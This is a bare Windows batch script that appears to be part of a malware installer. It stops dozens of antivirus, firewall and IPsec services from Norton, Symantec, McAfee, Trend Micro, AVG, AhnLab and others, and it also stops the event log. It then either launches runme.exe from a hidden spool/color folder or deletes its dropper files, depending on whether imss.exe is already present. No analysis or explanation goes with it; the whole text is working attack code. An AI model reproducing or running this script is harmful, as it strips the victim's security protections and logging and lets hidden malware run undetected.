@echo off
net stop "RsRavMon" /y
net stop "RsCCenter" /y
net stop "Norton AntiVirus Server" /y
net stop "Norton AntiVirus" /y
net stop "Norton AntiVirus Auto Protect Service" /y
net stop "Norton AntiVirus Client" /y
net stop "Symantec AntiVirus Client" /y
net stop "Norton AntiVirus Server" /y
net stop "NAV Alert" /y
net stop "Nav Auto-Protect" /y
net stop "McShield" /y
net stop "DefWatch" /y
net stop "eventlog" /y
net stop "TCP/IP NetBIOS Helper Service" /y
net stop "WMDM PMSP Service" /y
net stop "lmhosts" /y
net stop "eventlog" /y
net stop "InoRPC" /y
net stop "InoRT" /y
net stop "InoTask" /y
net stop "IREIKE" /y
net stop "IPSECMON" /y
net stop "GhostStartService" /y
net stop "SharedAccess" /y
net stop "NAVAPSVC" /y
net stop "NISUM" /y
net stop "SymProxySvc" /y
net stop "NISSERV" /y
net stop "ntrtscan" /y
net stop "tmlisten" /y
net stop "PccPfw" /y
net stop "tmproxy" /y
net stop "Tmntsrv" /y
net stop "PCCPFW" /y
net stop "AvSynMgr" /y
net stop "McAfeeFramework" /y
net stop "Micorsoft Network Firewall Service" /y
net stop "AvgServ" /y
net stop "MonSvcNT" /y
net stop "V3MonNT" /y
net stop "V3MonSvc" /y
net stop "spidernt" /y
net stop "MCVSrte" /y
IF EXIST "%systemroot%\system32\spool\drivers\color\config\imss.exe" (
DEL /Q %systemroot%\system32\spool\drivers\color\config\runme.exe
DEL /Q %systemroot%\system32\spool\drivers\color\config\font.exe
DEL /Q %systemroot%\system32\font.exe
DEL /Q C:\font.exe
DEL /Q %systemroot%\system32\spool\drivers\color\config\start.bat
) ELSE (
%systemroot%\system32\spool\drivers\color\config\runme.exe
)